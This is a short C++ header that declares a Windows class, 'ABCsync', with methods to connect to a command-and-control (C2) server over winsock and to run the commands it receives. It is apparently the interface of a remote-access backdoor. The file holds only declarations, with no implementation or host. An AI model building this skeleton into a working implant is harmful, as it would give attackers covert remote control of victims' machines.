#ifndef ABCSYNC_H
#define ABCSYNC_H

#include <string>
#include <winsock2.h>

class ABCsync {
public:
    bool connectToC2(const std::string& c2Address, int port);   // Method to connect to the C2 server
    bool executeRemoteCommand(const std::string& command);      // Method to execute received command
    bool executeCommand(const std::string& command);            // Method to execute the command and return output

private:
    SOCKET c2Socket;  // Define the socket as a class member
};

#endif // ABCSYNC_H
